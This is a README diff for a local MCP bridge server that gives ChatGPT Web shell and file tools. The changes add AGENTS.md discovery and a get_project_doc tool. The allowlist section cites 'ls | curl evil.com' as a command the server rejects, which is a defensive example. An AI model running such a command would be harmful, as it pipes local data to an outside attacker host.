@@ -6,7 +6,7 @@ A local MCP bridge server that lets ChatGPT Web Pro call tools on your machine: 
 
 ChatGPT talks to a public tunnel URL, which forwards to this server running on your machine, which operates on a project directory you choose.
 
-Since v0.4.0 the tool set also covers the ones [Codex](https://github.com/openai/codex) gives its own agent — `apply_patch`, `exec_command`/`write_stdin`, `view_image`, `update_plan`, `clock_curr_time`/`clock_sleep` — so ChatGPT Web can work the way Codex does: patch files in place instead of rewriting them, drive interactive and long-running processes, and keep a plan across a task. The schemas are ported from the Codex source, not reimplemented from guesswork.
+Since v0.4.0 the tool set also covers the ones [Codex](https://github.com/openai/codex) gives its own agent — `apply_patch`, `exec_command`/`write_stdin`, `view_image`, `update_plan`, `clock_curr_time`/`clock_sleep` — so ChatGPT Web can work the way Codex does: patch files in place instead of rewriting them, drive interactive and long-running processes, and keep a plan across a task. Since v0.5.0 it also reads the project's `AGENTS.md` the way Codex does. The schemas are ported from the Codex source, not reimplemented from guesswork.
 
 ## Architecture
 
@@ -24,7 +24,7 @@ flowchart LR
     Edit["apply_patch"]
     Exec["exec_command\nwrite_stdin"]
     Agent["view_image\nupdate_plan\nclock_curr_time\nclock_sleep"]
-    Env["get_environment"]
+    Env["get_environment\nget_project_doc"]
     WorkDir[("Project\nDirectory")]
 
     ChatGPT -- "HTTPS" --> Tunnel
@@ -100,13 +100,14 @@ Ported from Codex (`codex-rs/core/src/tools`, commit `2230d64`):
 
 Codex's dotted names are flattened to underscores because MCP tool names must match `^[a-zA-Z0-9_-]{1,64}$`.
 
-One tool has no Codex counterpart:
+Two tools have no Codex counterpart:
 
 | Tool | Description |
 |------|-------------|
 | `get_environment` | Report the OS, the shell `exec_command` uses, the work directory, and what the policy allows |
+| `get_project_doc` | Read the project's `AGENTS.md` instructions |
 
-Codex tells its model the OS and shell through an `<environment_context>` message before the first turn. An MCP server has no such channel — it can only expose tools — so the same facts are a tool call here. See [Shells and the host](#shells-and-the-host).
+Codex needs neither: it tells its model the OS and shell through an `<environment_context>` message and loads `AGENTS.md` straight into the prompt, both before the first turn. An MCP server can only expose tools, so the same facts are tool calls here as well as part of the server's `instructions`. See [Shells and the host](#shells-and-the-host) and [AGENTS.md](#agentsmd).
 
 Two deliberate differences from Codex:
 
@@ -115,7 +116,7 @@ Two deliberate differences from Codex:
 
 `clock_sleep` also caps at 5 minutes rather than Codex's 12 hours — a longer wait would outlive the HTTP request through the tunnel.
 
-Every tool that advertises an `outputSchema` also returns `structuredContent` matching it, as the MCP spec asks. `exec_command` and `write_stdin` return Codex's unified-exec object, `clock_curr_time` returns `{ current_time }` and `get_environment` returns the environment object; the rest return `{ content: <text> }`, which the server derives from the text blocks so handlers don't repeat it.
+Every tool that advertises an `outputSchema` also returns `structuredContent` matching it, as the MCP spec asks. `exec_command` and `write_stdin` return Codex's unified-exec object, `clock_curr_time` returns `{ current_time }`, `get_environment` returns the environment object and `get_project_doc` returns `{ files, content }`; the rest return `{ content: <text> }`, which the server derives from the text blocks so handlers don't repeat it.
 
 All paths are resolved relative to `--work-dir`.
 
@@ -142,6 +143,11 @@ All paths are resolved relative to `--work-dir`.
       "which", "rg", "sed", "awk", "sort", "uniq", "diff", "true", "false"
     ],
     "maxSessions": 8
+  },
+  "projectDoc": {
+    "maxBytes": 32768,
+    "fallbackFilenames": [],
+    "rootMarkers": [".git"]
   }
 }
 ```
@@ -158,6 +164,14 @@ The `exec` block governs `exec_command` and `write_stdin`:
 | `defaultShell` | `$SHELL`, else PowerShell on Windows and `/bin/sh` elsewhere | Shell used when an `exec_command` call names none |
 
 Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
+
+The `projectDoc` block governs [AGENTS.md](#agentsmd) discovery. All three keys are optional, and the block itself can be left out entirely:
+
+| Key | Default | Description |
+|-----|---------|-------------|
+| `maxBytes` | `32768` | Byte budget shared by all the docs found; `0` disables the feature |
+| `fallbackFilenames` | `[]` | Extra filenames to try per directory, after `AGENTS.override.md` and `AGENTS.md` |
+| `rootMarkers` | `[".git"]` | Filenames or directories that mark the project root; an empty list stops the walk at the work directory |
 
 ## Shells and the host
 
@@ -179,6 +193,19 @@ Because the resolved shell decides what a command should even look like, it is p
 - **`exec_command`'s description**, which names the actual shell binary and its syntax family.
 - **`get_environment`**, for clients that read neither.
 
+## AGENTS.md
+
+A project's `AGENTS.md` is how it tells an agent its own conventions — which test command to run, which files not to touch, how commits should look. Codex reads it before the first turn; since v0.5.0 so does this bridge, using the same algorithm as `codex-rs/core/src/agents_md.rs`.
+
+Discovery walks up from `--work-dir` to the nearest directory holding a **root marker** (`.git` by default), then collects **one doc per directory on the way back down**, so a monorepo's root conventions arrive before the ones belonging to the subdirectory you pointed the server at. In each directory, `AGENTS.override.md` wins over `AGENTS.md`, which wins over anything in `projectDoc.fallbackFilenames`. The files are concatenated outermost-first under a **shared 32 KiB budget**, counted in bytes rather than characters; a file that runs past what is left is cut there and reported as truncated, and whitespace-only files are skipped without spending any of it. If no marker is found anywhere above, only the work directory itself is checked.
+
+Like the environment, the result is published more than one way:
+
+- **`instructions`** carries the doc inline, behind Codex's own `--- project-doc ---` separator. Everything past that marker is the project speaking, and it outranks the bridge's own working notes.
+- **`get_project_doc`** returns the identical text for clients that never read `instructions`, along with the absolute path of every file it came from and whether each was truncated.
+
+Instructions are built per MCP session, so editing `AGENTS.md` takes effect on the next connection without restarting the server.
+
 ## Connecting to ChatGPT
 
 1. In ChatGPT, go to **Settings > Security and login** and enable **Developer mode**.
@@ -197,6 +224,7 @@ Because the resolved shell decides what a command should even look like, it is p
 ## Security
 
 - **Path traversal prevention**: every filesystem tool — including `apply_patch` and `view_image` — resolves paths through a guard that rejects anything outside `--work-dir`.
+- **One bounded exception**: [AGENTS.md](#agentsmd) discovery reads above `--work-dir`, up to the nearest `.git`. Nothing else does. It is read-only, opens only `AGENTS.override.md`, `AGENTS.md` and any `projectDoc.fallbackFilenames`, and `get_project_doc` reports the absolute path of every file it used. Set `projectDoc.maxBytes` to `0` to switch it off, or `projectDoc.rootMarkers` to `[]` to keep the search inside the work directory.
 - **Command allowlist**: `run_command` only runs binaries listed in `allowedCommands`; everything else is rejected. `exec_command` checks the same list plus `exec.extraAllowedCommands`, at every command position in the string.
 - **Optional bearer token auth**: set `--api-key` to require an `Authorization: Bearer <key>` header on all requests (except `/health`). Useful for non-ChatGPT clients. ChatGPT Plugins do not support simple bearer token auth.
 
